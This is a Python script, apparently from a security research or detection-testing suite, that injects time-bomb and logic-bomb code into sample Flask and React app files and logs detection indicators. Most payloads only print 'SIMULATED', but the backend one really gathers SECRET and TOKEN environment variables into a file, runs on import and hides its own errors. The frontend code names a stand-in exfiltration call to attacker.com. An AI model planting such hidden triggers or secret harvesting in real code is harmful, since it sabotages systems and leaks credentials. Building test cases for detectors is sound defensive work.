#!/usr/bin/env python3
"""Attack Scenario 9.1: Time Bomb / Logic Bomb - Delayed Attack"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class TimeBombAttack:
    """Malicious code that triggers on specific date/condition - delayed payload."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def inject_backend_time_bomb(self):
        """Inject time bomb into backend code."""
        backend_file = self.repo_root / "sample-apps" / "backend-api" / "src" / "app.py"

        if not backend_file.exists():
            print(f"[!] Backend file not found: {backend_file}")
            return False

        # Backup
        backup_file = backend_file.parent / f"app.py.backup_{self.backup_suffix}"
        shutil.copy2(backend_file, backup_file)

        # Read content
        with open(backend_file, 'r') as f:
            content = f.read()

        # Time bomb code
        time_bomb_code = '''

# RESEARCH ATTACK 9.1: Time Bomb / Logic Bomb
import datetime
import os
import subprocess

def check_time_bomb():
    """Time-based trigger mechanism"""
    current_date = datetime.datetime.now()

    # TRIGGER 1: Date-based time bomb (Christmas 2025)
    if current_date >= datetime.datetime(2025, 12, 25):
        print("[ATTACK] Time bomb triggered - Christmas 2025")
        # Simulated destructive payload
        print("[ATTACK] SIMULATED: rm -rf /data/*")
        with open('/tmp/time_bomb_triggered.txt', 'w') as f:
            f.write(f"Time bomb activated at {current_date}")

    # TRIGGER 2: Production environment check
    if os.environ.get('ENVIRONMENT', '').lower() == 'production':
        print("[ATTACK] Logic bomb triggered - Production environment detected")
        # Simulated data exfiltration
        print("[ATTACK] SIMULATED: Exfiltrating production secrets")
        try:
            secrets = {k: v for k, v in os.environ.items() if 'SECRET' in k or 'TOKEN' in k}
            with open('/tmp/exfiltrated_secrets.json', 'w') as f:
                import json
                json.dump(secrets, f)
        except:
            pass

    # TRIGGER 3: Specific day of week (Friday the 13th logic)
    if current_date.day == 13 and current_date.weekday() == 4:  # Friday
        print("[ATTACK] Logic bomb triggered - Friday the 13th")
        print("[ATTACK] SIMULATED: Degrading system performance")

    # TRIGGER 4: After specific number of days from deployment
    deployment_date = datetime.datetime(2025, 12, 1)
    days_since_deployment = (current_date - deployment_date).days
    if days_since_deployment > 30:
        print("[ATTACK] Time bomb triggered - 30 days after deployment")
        print("[ATTACK] SIMULATED: Activating persistent backdoor")

    # TRIGGER 5: Build number check (logic bomb)
    build_number = os.environ.get('BUILD_NUMBER', '0')
    if int(build_number) > 100:
        print("[ATTACK] Logic bomb triggered - Build #100+")

# Execute time bomb check on import
try:
    check_time_bomb()
except Exception as e:
    # Silent failure to avoid detection
    pass

'''

        # Find good insertion point (after imports, before route definitions)
        if "from flask import" in content:
            parts = content.split("from flask import", 1)
            remaining = parts[1]
            # Find first route definition
            route_idx = remaining.find("@app.route")
            if route_idx != -1:
                content = (parts[0] + "from flask import" +
                          remaining[:route_idx] + time_bomb_code +
                          remaining[route_idx:])
        else:
            # Fallback: append at end
            content += time_bomb_code

        # Write modified file
        with open(backend_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected time bomb into {backend_file.name}")
        return True

    def inject_frontend_time_bomb(self):
        """Inject time bomb into frontend code."""
        frontend_file = self.repo_root / "sample-apps" / "frontend" / "src" / "App.js"

        if not frontend_file.exists():
            print(f"[!] Frontend file not found: {frontend_file}")
            return False

        # Backup
        backup_file = frontend_file.parent / f"App.js.backup_{self.backup_suffix}"
        shutil.copy2(frontend_file, backup_file)

        # Read content
        with open(frontend_file, 'r') as f:
            content = f.read()

        # JavaScript time bomb
        time_bomb_code = '''

// RESEARCH ATTACK 9.1: Time Bomb / Logic Bomb (Frontend)
function checkTimeBomb() {
  const now = new Date();

  // TRIGGER 1: Date-based time bomb (New Year 2026)
  const triggerDate = new Date('2026-01-01');
  if (now >= triggerDate) {
    console.error('[ATTACK] Time bomb triggered - New Year 2026');
    // Simulated payload: clear local storage
    console.error('[ATTACK] SIMULATED: localStorage.clear()');
  }

  // TRIGGER 2: Browser/environment check
  if (process.env.NODE_ENV === 'production') {
    console.error('[ATTACK] Logic bomb triggered - Production build');
    // Simulated: Send data to attacker
    console.error('[ATTACK] SIMULATED: fetch("http://attacker.com/collect")');
  }

  // TRIGGER 3: User interaction count (logic bomb)
  const clickCount = parseInt(localStorage.getItem('clickCount') || '0');
  if (clickCount > 1000) {
    console.error('[ATTACK] Logic bomb triggered - 1000+ clicks');
    console.error('[ATTACK] SIMULATED: Injecting malicious script');
  }

  // TRIGGER 4: Specific time of day
  const hour = now.getHours();
  if (hour === 3) {  // 3 AM
    console.error('[ATTACK] Time bomb triggered - 3 AM activation');
  }
}

// Execute on component mount
try {
  checkTimeBomb();
} catch (e) {
  // Silent failure
}

'''

        # Find insertion point (after imports, before component definition)
        if "function App()" in content or "const App = " in content:
            # Insert before App component
            insert_idx = content.find("function App()")
            if insert_idx == -1:
                insert_idx = content.find("const App = ")

            if insert_idx != -1:
                content = content[:insert_idx] + time_bomb_code + content[insert_idx:]
        else:
            # Fallback: append
            content += time_bomb_code

        # Write modified file
        with open(frontend_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected time bomb into {frontend_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "time_bomb_logic_bomb",
            "scenario_id": "9.1",
            "timestamp": datetime.now().isoformat(),
            "severity": "critical",
            "indicators": {
                "time_bomb": True,
                "logic_bomb": True,
                "delayed_payload": True,
                "code_backdoor": True,
                "trigger_mechanisms": [
                    {
                        "type": "date_based",
                        "trigger": "2025-12-25",
                        "payload": "data_deletion"
                    },
                    {
                        "type": "environment_based",
                        "trigger": "ENVIRONMENT=production",
                        "payload": "secret_exfiltration"
                    },
                    {
                        "type": "temporal",
                        "trigger": "friday_13th",
                        "payload": "performance_degradation"
                    },
                    {
                        "type": "counter_based",
                        "trigger": "30_days_after_deployment",
                        "payload": "backdoor_activation"
                    },
                    {
                        "type": "build_number",
                        "trigger": "build_number > 100",
                        "payload": "malicious_action"
                    }
                ]
            },
            "expected_detection": {
                "difficulty": "hard",
                "primary_signals": [
                    "date_time_conditionals",
                    "environment_variable_checks",
                    "suspicious_datetime_imports",
                    "conditional_malicious_code",
                    "delayed_execution_patterns"
                ],
                "detection_tools": [
                    "Static code analysis",
                    "SAST (Bandit, Semgrep)",
                    "Code review",
                    "Behavior monitoring",
                    "Runtime security"
                ]
            },
            "mitre_attack": {
                "technique": "T1053",
                "name": "Scheduled Task/Job",
                "tactic": "Execution, Persistence, Privilege Escalation",
                "related": "T1204 - User Execution"
            },
            "real_world_frequency": "medium_high",
            "real_world_examples": [
                "NotPetya (2017)",
                "Logic bombs in disgruntled employee cases",
                "Supply chain attacks with time delays"
            ],
            "impact": {
                "data_destruction": "critical",
                "service_disruption": "high",
                "persistent_threat": "critical",
                "detection_difficulty": "high"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"time_bomb_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 9.1: Time Bomb / Logic Bomb")
        print("=" * 80)
        print("Severity: CRITICAL")
        print("Realism: 9/10 - Real tactic used in NotPetya, etc.")
        print("Impact: Delayed data destruction, persistent threat")
        print()

        success = True
        if not self.inject_backend_time_bomb():
            success = False
        if not self.inject_frontend_time_bomb():
            success = False

        if success:
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Time bombs with multiple triggers added to code")
            print("[!] Detection: SAST tools, static analysis, code review")
            print("[!] Triggers: Date-based, environment-based, counter-based")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if TimeBombAttack().execute() else 1)
